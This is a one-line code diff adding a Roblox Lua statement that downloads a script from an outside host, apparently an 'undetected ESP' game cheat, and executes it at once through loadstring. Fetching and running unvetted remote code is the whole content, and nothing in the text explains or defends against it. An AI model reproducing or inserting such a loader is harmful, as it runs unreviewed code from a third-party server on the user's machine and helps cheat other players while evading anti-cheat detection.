@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://sjonks.xyz/sjonksUndetectedESP.lua"))()
